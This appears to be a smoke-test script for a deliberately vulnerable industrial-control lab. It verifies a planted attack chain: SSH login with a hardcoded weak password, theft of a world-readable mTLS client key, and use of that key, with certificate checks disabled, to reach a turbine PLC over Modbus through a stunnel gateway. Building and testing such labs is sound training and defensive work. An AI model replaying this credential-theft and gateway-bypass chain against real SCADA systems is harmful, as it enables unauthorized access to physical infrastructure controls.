#!/usr/bin/env bash
# The SCADA container holds a world-readable mTLS client key in
# /run/stunnel-certs/. With the key, an attacker can connect directly to the
# stunnel gateway (uupl-modbus-gw, 10.10.2.50:8502) which forwards plain
# Modbus TCP to the turbine PLC, bypassing the SCADA control path entirely.
#
# Coverage:
#   Stage 1   ssh scada_admin@10.10.2.20 with W1nd0ws@2016 authenticates
#   Stage 2   /run/stunnel-certs/client.{crt,key,ca.crt} are world-readable
#   Stage 3   openssl s_client to the gateway with the stolen cert/key
#             completes the TLS handshake
#   Stage 4   Modbus read through a TLS tunnel using the stolen cert reaches
#             the turbine PLC behind the gateway
#
# Usage: bash tests/smoke/test_stunnel_client_key_theft.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ATTACKER="unseen-gate"
SCADA="distribution-scada"
ENG_WS="uupl-eng-ws"
GW="uupl-modbus-gw"
PLC="hex-turbine-plc"

for c in "$ATTACKER" "$SCADA" "$ENG_WS" "$GW" "$PLC"; do
    require_running "$c"
done

echo "[stunnel] Waiting for SCADA SSH and stunnel gateway..."
wait_for_port "$ENG_WS" 10.10.2.20 22   30 || fail "distribution-scada :22 not ready from eng-ws"
wait_for_port "$ENG_WS" 10.10.2.50 8502 30 || fail "stunnel gateway :8502 not ready from eng-ws"
wait_for_port "$ENG_WS" 10.10.3.21 502  30 || fail "turbine PLC :502 not ready from eng-ws"

echo "[stunnel] Stage 1: SSH scada_admin/W1nd0ws@2016 via wizzards-retreat jump"

SCADA_LOGIN="$(ssh_password_login_via_jump "$ATTACKER" \
    rincewind 10.10.0.10 wizzard \
    scada_admin 10.10.2.20 W1nd0ws@2016)"
assert_contains "$SCADA_LOGIN" "SSH_OK" "ssh scada_admin/W1nd0ws@2016 authenticates"

echo "[stunnel] Stage 2: client cert and key are world-readable on distribution-scada"

PERMS="$(in_container "$SCADA" sh -c '
ls -la /run/stunnel-certs/client.crt /run/stunnel-certs/client.key /run/stunnel-certs/ca.crt 2>&1
')"
assert_contains "$PERMS" "client\\.crt" "/run/stunnel-certs/client.crt present"
assert_contains "$PERMS" "client\\.key" "/run/stunnel-certs/client.key present"
assert_contains "$PERMS" "ca\\.crt"     "/run/stunnel-certs/ca.crt present"
WORLD_READABLE_KEY="$(printf '%s' "$PERMS" | grep client\\.key | awk '{print $1}')"
if printf '%s' "$WORLD_READABLE_KEY" | grep -qE '^-rw-r--r--'; then
    ok "client.key is 644 (world-readable, HEX-5103 risk-accepted)"
else
    fail "client.key has perms $WORLD_READABLE_KEY (expected -rw-r--r--)"
fi

# Runbook also calls 'cat /run/stunnel-certs/client.key' to show the PEM
# format. The annotation says PKCS#8 (BEGIN PRIVATE KEY).
KEY_PEM="$(in_container "$SCADA" head -1 /run/stunnel-certs/client.key 2>&1)"
assert_contains "$KEY_PEM" "BEGIN PRIVATE KEY" \
    "client.key starts with BEGIN PRIVATE KEY (PKCS#8 as runbook annotates)"

echo "[stunnel] Stage 3 + 4: stolen cert opens TLS to gateway and reads Modbus on PLC"

# The realistic visitor path is scp from distribution-scada to eng-ws (which has
# python3 + pymodbus). For the test we stage the cert/key/ca through the host
# via docker cp, run the TLS-wrapped Modbus read on eng-ws, then clean up.
HOST_TMP="$(mktemp -d)"
trap 'rm -rf "$HOST_TMP"' EXIT
docker cp "$SCADA":/run/stunnel-certs/client.crt "$HOST_TMP/client.crt"
docker cp "$SCADA":/run/stunnel-certs/client.key "$HOST_TMP/client.key"
docker cp "$SCADA":/run/stunnel-certs/ca.crt     "$HOST_TMP/ca.crt"
docker exec "$ENG_WS" rm -rf /tmp/stolen_certs
docker exec "$ENG_WS" mkdir -p /tmp/stolen_certs
docker cp "$HOST_TMP/client.crt" "$ENG_WS":/tmp/stolen_certs/client.crt
docker cp "$HOST_TMP/client.key" "$ENG_WS":/tmp/stolen_certs/client.key
docker cp "$HOST_TMP/ca.crt"     "$ENG_WS":/tmp/stolen_certs/ca.crt

TUNNEL_OUT="$(in_container "$ENG_WS" /venv/bin/python3 -c "
import socket, ssl, struct, sys, traceback
# Gateway is pinned to TLSv1.2 (HEX-3887, never re-prioritised). Lower the
# openssl 3 cipher security level so older RSA key sizes in the lab certs
# negotiate at SECLEVEL=0 rather than being filtered out at SECLEVEL=2.
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.set_ciphers('DEFAULT@SECLEVEL=0')
ctx.load_cert_chain(
    certfile='/tmp/stolen_certs/client.crt',
    keyfile='/tmp/stolen_certs/client.key',
)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
try:
    raw = socket.create_connection(('10.10.2.50', 8502), timeout=5)
    tls = ctx.wrap_socket(raw, server_hostname='uupl-modbus-gw')
    print('TLS_OK', 'cipher=', tls.cipher())
except Exception as e:
    print('TLS_FAIL:', type(e).__name__, e)
    traceback.print_exc()
    raise SystemExit(1)
# Modbus TCP read input registers, FC04, unit 1, addr 0, count 1
req = struct.pack('>HHHBBHH', 1, 0, 6, 1, 4, 0, 1)
try:
    tls.sendall(req)
    resp = tls.recv(64)
    tls.close()
    if len(resp) >= 9 and resp[7] == 4:
        val = struct.unpack('>H', resp[9:11])[0]
        print('MODBUS_OK', val)
    else:
        print('MODBUS_UNEXPECTED bytes=', resp.hex())
except Exception as e:
    print('MODBUS_FAIL:', type(e).__name__, e)
" 2>&1)"

# Surface the actual error so failures are diagnosable rather than just 'pattern not found'.
printf '%s\n' "$TUNNEL_OUT" | sed 's/^/    [tls] /'

docker exec "$ENG_WS" rm -rf /tmp/stolen_certs

assert_contains "$TUNNEL_OUT" "TLS_OK"    "TLS handshake to stunnel gateway succeeds with stolen cert"
assert_contains "$TUNNEL_OUT" "MODBUS_OK" "Modbus FC04 through tunnel returns a register from the PLC"

summary